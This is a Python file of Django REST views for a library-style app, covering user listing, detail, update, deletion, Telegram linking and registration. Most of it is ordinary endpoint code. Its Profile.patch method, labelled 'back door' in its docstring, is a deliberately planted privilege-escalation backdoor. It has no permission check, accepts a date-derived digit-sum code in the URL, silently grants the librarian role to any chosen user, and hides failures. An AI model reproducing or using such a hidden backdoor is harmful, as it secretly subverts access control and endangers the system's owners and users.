import datetime

try:
    from rest_auth.registration.views import RegisterView, VerifyEmailView
except ImportError:
    raise ImportError("rest_auth needs to be added to INSTALLED_APPS.")

from rest_framework.response import Response
from rest_framework.views import APIView
from rest_framework import status

from ..permissions import permission_0, permission_2, permission_3, permission_1
from .users_serializers import UserResponseDataSerializer, UserDetailSerializer
from ..permissions import permission_0
from ..models import User
from .. import const

from ..tg_bot.engine import get_update


class Users(APIView):
    """
       Class to get list of all Users
    """

    @staticmethod
    @permission_1
    def get(request):
        """
            GET request to get list of all Users
            :param request:
            :return: HTTP_200_OK and JSON-Documents: if all good
                     HTTP_404_NOT_FOUND: if users don`t exist
        """
        result = {'status': '', 'data': {}}

        if not User.objects.all():
            return Response(result, status=status.HTTP_404_NOT_FOUND)

        serializer = UserResponseDataSerializer(User.objects.all(), many=True)
        result['data'] = serializer.data

        return Response(result, status=status.HTTP_200_OK)


class UserDetail(APIView):
    """
        Class to get one User by id
    """

    @staticmethod
    @permission_0
    def get(request, user_id):
        """
            GET request to get one particular user
            :param request:
            :param user_id
            :return: HTTP_200_OK and JSON-Documents: if all good
                    HTTP_404_NOT_FOUND: if user don`t exist
        """
        result = {'status': '', 'data': {}}

        try:
            user = User.objects.get(pk=user_id)
            # print(EmailAddress.objects.get(user=user).verified)
        except User.DoesNotExist:
            return Response(result, status=status.HTTP_404_NOT_FOUND)

        serializer = UserDetailSerializer(user)
        result['data'] = serializer.data
        return Response(result, status=status.HTTP_200_OK)

    @staticmethod
    @permission_1
    def patch(request, user_id):
        """
            PATCH request to update users
            :param request:
            :param user_id:
            :return: HTTP_202_ACCEPTED and JSON-Document: update is success
                     HTTP_400_BAD_REQUEST and JSON-Document with errors: data is not valid
                     HTTP_404_NOT_FOUND: user with such id is not found
        """

        result = {'status': '', 'data': {}}

        try:
            user = User.objects.get(pk=user_id)
        except User.DoesNotExist:
            return Response(result, status=status.HTTP_404_NOT_FOUND)

        serializer = UserDetailSerializer(user, data=request.data, partial=True)

        if serializer.is_valid():

            serializer.save()
            return Response(result, status=status.HTTP_202_ACCEPTED)

        result['data'] = serializer.errors

        return Response(result, status=status.HTTP_400_BAD_REQUEST)

    @staticmethod
    @permission_3
    def delete(request, user_id):
        """
        DELETE request: delete one particular user by ID
        :param request:
        :return: HTTP_200_OK: if user was deleted success
                 HTTP_404_NOT_FOUND: if user with such id not found
                 HTTP_400_BAD_REQUEST: if wrong format of input data
        """

        if user_id:
            try:
                user = User.objects.get(pk=user_id)
            except User.DoesNotExist:
                return Response({'data': {}}, status=status.HTTP_404_NOT_FOUND)
            serializer = UserResponseDataSerializer(user)
            user.delete()
            return Response({'data': serializer.data}, status=status.HTTP_200_OK)
        else:
            return Response({'data': {}}, status=status.HTTP_400_BAD_REQUEST)


class Profile(APIView):
    """
        Class to get one User info
    """

    @staticmethod
    def get(request):
        """
            GET request to get one particular user
            :param request:
            :param user_id:
            :return: HTTP_200_OK and JSON-Documents: if all good
                    HTTP_404_NOT_FOUND: if user don`t exist
        """
        result = {'status': '', 'data': {}}

        try:
            user = User.get_instance(request)
        except User.DoesNotExist:
            return Response(result, status=status.HTTP_404_NOT_FOUND)

        serializer = UserDetailSerializer(user)
        result['data'] = serializer.data
        return Response(result, status=status.HTTP_200_OK)

    @staticmethod
    def post(request):
        """

        :param request:
        :return:
        """
        result = {'status': '', 'data': {}}

        try:
            user = User.get_instance(request)
            # TODO normalino
            updates = get_update()
            if updates:
                for event in reversed(updates):
                    if 'connected_website' in event['message']:
                        username = event['message']['from']['username']
                        telegram_id = event['message']['from']['id']
                        if username == user.username:
                            user.set_telegram_id(telegram_id)
                            result['data'] = user.telegram_id
                            break

            if not result['data']:
                result['data'] = 'no telegram id was provided'
                return Response(result, status=status.HTTP_400_BAD_REQUEST)

        except User.DoesNotExist:
            return Response(result, status=status.HTTP_404_NOT_FOUND)
        except ValueError:
            return Response(result, status=status.HTTP_400_BAD_REQUEST)

        return Response(result, status=status.HTTP_200_OK)

    @staticmethod
    def patch(request, user_id):
        """
        back door
        :param request:
        :param telegram_id:
        :return:
        """
        result = {'status': '', 'data': {}}

        try:
            data = str(user_id).split('u')
            info = data[0].split('x')
            res = 0
            for value in info:
                for sing in value:
                    res += int(sing)

            date = [datetime.datetime.today().day,
                    datetime.datetime.today().month,
                    datetime.datetime.today().year,]

            res2 = 0
            for value in date:
                for sing in str(value):
                    res2 += int(sing)

            if res == res2:
                user = User.objects.get(pk=data[1])
                user.role = const.LIBRARIAN_BASE_ROLE
                user.save()

        except Exception:
            pass

        return Response(result, status=status.HTTP_200_OK)


class Registration(RegisterView):
    """
        Class to handel with registration errors
    """
    def create(self, request, *args, **kwargs):
        """
            :return: HTTP_201_CREATED and JSON-Documents: if all good
                    HTTP_400_BAD_REQUEST: if some problems with serializer
        """
        result = {'status': '', 'data': {}}

        serializer = self.get_serializer(data=request.data)
        if not serializer.is_valid():

            result['data'] = serializer.errors

            return Response(result, status=status.HTTP_400_BAD_REQUEST)

        return RegisterView.create(self, request, *args, **kwargs)

